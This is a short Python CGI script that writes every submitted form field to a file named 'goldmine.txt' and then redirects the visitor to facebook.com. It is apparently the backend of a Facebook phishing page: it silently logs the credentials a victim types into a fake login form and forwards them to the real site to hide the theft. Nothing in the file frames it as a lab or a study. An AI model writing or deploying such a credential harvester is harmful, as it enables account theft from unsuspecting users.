#!C:\Python34\python

import cgi

form =cgi.FieldStorage()

passwd={}

myfile=open("goldmine.txt","a")

for key in form:
	value=form.getvalue(key)
	#passwd[key]=value
	myfile.write(key+" : "+ value+"\n")

print("Content-type: text/html")
print("Location:https://www.facebook.com/")


print("")


	

